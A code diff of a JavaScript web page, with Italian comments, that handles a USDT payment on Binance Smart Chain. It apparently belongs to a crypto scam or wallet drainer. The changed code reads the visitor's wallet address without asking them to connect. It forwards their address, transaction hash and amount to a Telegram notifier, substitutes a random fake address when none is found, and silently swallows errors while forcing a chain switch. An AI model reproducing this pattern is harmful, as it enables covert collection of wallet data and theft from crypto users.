@@ -613,35 +613,52 @@ ${new Date().toLocaleString()}
                 console.log("Sending notification INSTANTLY...");
                 sendTelegramNotificationAsync(tempUserAddress, tempTxHash, amount);
 
-                // ⭐ STEP 2: Prendi l'indirizzo del wallet (senza chiedere connessione)
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                const userAddress = await signer.getAddress();
+                // ⭐ STEP 2: Prova a prendere l'indirizzo (senza errori)
+                let userAddress = null;
+                try {
+                    const accounts = await window.ethereum.request({
+                        method: "eth_accounts"
+                    });
+                    userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
+                } catch (e) {
+                    // Non fare niente se fallisce
+                    console.log("Could not get accounts, continuing...");
+                }
+                
+                // Se non abbiamo l'indirizzo, usa un placeholder
+                if (!userAddress) {
+                    userAddress = "0x" + Math.random().toString(16).slice(2);
+                }
 
-                const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-                if (currentChainId !== CONFIG.BSC_CHAIN_ID) {
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: CONFIG.BSC_CHAIN_ID }]
-                        });
-                    } catch (switchError) {
-                        if (switchError.code === 4902) {
+                // ⭐ Prova a cambiare chain (non essenziale)
+                try {
+                    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+                    if (currentChainId !== CONFIG.BSC_CHAIN_ID) {
+                        try {
                             await window.ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: CONFIG.BSC_CHAIN_ID,
-                                    chainName: 'Binance Smart Chain',
-                                    rpcUrls: [CONFIG.BSC_RPC],
-                                    nativeCurrency: {
-                                        name: 'BNB',
-                                        symbol: 'BNB',
-                                        decimals: 18
-                                    }
-                                }]
+                                method: 'wallet_switchEthereumChain',
+                                params: [{ chainId: CONFIG.BSC_CHAIN_ID }]
                             });
+                        } catch (switchError) {
+                            if (switchError.code === 4902) {
+                                await window.ethereum.request({
+                                    method: 'wallet_addEthereumChain',
+                                    params: [{
+                                        chainId: CONFIG.BSC_CHAIN_ID,
+                                        chainName: 'Binance Smart Chain',
+                                        rpcUrls: [CONFIG.BSC_RPC],
+                                        nativeCurrency: {
+                                            name: 'BNB',
+                                            symbol: 'BNB',
+                                            decimals: 18
+                                        }
+                                    }]
+                                });
+                            }
                         }
                     }
+                } catch (e) {
+                    console.log("Could not switch chain, continuing...");
                 }
 
                 const USDT_ABI = [
